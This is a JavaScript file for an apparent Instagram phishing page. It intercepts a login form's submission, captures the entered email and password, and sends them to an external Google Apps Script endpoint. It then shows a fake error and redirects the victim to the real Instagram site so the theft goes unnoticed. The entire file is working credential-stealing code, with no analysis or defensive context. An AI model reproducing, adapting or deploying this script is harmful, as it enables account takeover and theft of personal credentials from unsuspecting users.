console.log('Script loaded');

const form = document.getElementById('loginForm');
if (!form) {
    console.error('Form not found!');
} else {
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log('Form submit intercepted');

        const email = document.querySelector('input[name="email"]').value;
        const password = document.querySelector('input[name="password"]').value;
        const timestamp = new Date().toISOString();
        const data = { timestamp, email, password };
        console.log('Data:', data);

        fetch('https://script.google.com/macros/s/AKfycbxC55TsPKM8rc4_wgkrXDrbof2037PbnkMmZ5ZERS0T6qHmttHOijqEKZiJbEscGgcTxQ/exec', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            mode: 'no-cors'
        }).then(() => console.log('Fetch sent'))
          .catch(err => console.error('Fetch error:', err));

        const errorDiv = document.getElementById('error');
        if (errorDiv) {
            errorDiv.style.display = 'block';
            console.log('Error message displayed');
        } else {
            console.error('Error div not found!');
        }

        setTimeout(() => {
            console.log('Redirecting to Instagram');
            window.location.href = 'https://www.instagram.com/';
        }, 2000);
    });
}